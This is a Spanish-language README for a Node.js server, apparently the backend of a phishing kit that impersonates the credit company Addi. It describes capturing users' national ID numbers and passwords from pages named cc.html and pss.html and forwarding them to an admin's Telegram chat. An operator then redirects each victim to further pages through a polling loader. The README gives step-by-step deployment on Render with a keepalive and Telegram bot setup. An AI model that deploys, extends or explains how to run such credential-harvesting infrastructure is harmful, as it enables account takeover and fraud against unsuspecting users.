# 🤖 Addi Telegram Server

Backend server para integración de Addi + Telegram. Recibe datos de formularios, envía mensajes a Telegram con botones interactivos, y redirige usuarios.

## 📋 Características

- ✅ Recibe datos de formularios (cédula, contraseña)
- ✅ Envía mensajes a Telegram con emojis y botones
- ✅ Admin puede redirigir usuarios a diferentes páginas
- ✅ Polling para comunicación en tiempo real
- ✅ Session management con TTL automático
- ✅ Keepalive para Render (no duerme)

## 🚀 Deployment en Render

### Paso 1: Crear repositorio en GitHub

```bash
git init
git add .
git commit -m "Initial commit: Addi Telegram server"
git branch -M main
git remote add origin https://github.com/TU_USUARIO/addi-telegram-server.git
git push -u origin main
```

### Paso 2: Crear app en Render

1. Ve a https://render.com
2. Haz login / Crea cuenta
3. Click en "New +" → "Web Service"
4. Conecta tu repositorio GitHub
5. Configura:
   - **Name:** `addi-bot`
   - **Environment:** `Node`
   - **Build Command:** `npm install`
   - **Start Command:** `npm start`
   - **Plan:** Free

### Paso 3: Agregar variables de entorno

En Render, agrega estas variables:

```
TELEGRAM_BOT_TOKEN = your_bot_token_here
TELEGRAM_ADMIN_CHAT_ID = your_admin_chat_id_here
TELEGRAM_WEBHOOK_SECRET = your_webhook_secret_here
SESSION_TTL = 1800
NODE_ENV = production
SERVER_URL = https://addi-bot.onrender.com
PORT = 3000
```

## 🤖 Configuración Telegram

### Crear bot

1. Abre Telegram y busca `@BotFather`
2. Envía `/newbot`
3. Nombre: `Addi Monitor Bot`
4. Username: `addi_monitor_bot`
5. Guarda el TOKEN

### Obtener Chat ID

1. Busca `@userinfobot`
2. Envía un mensaje
3. Te dirá tu user ID (ese es tu Chat ID)

### Registrar webhook

```bash
node scripts/setup-webhook.js
```

## 📡 Endpoints

```
GET  /health                    - Status check
GET  /api/keepalive             - Keepalive anti-sleep
POST /api/register              - Registrar usuario (desde cc.html)
POST /api/user-data             - Datos + enviar Telegram (desde pss.html)
GET  /api/poll/:sessionId       - Polling de comandos (desde loader.html)
GET  /api/debug/sessions        - Ver sesiones (solo dev)
```

## 🛠️ Desarrollo local

```bash
npm install
npm run dev
```

---

**Hecho con ❤️ para Addi**
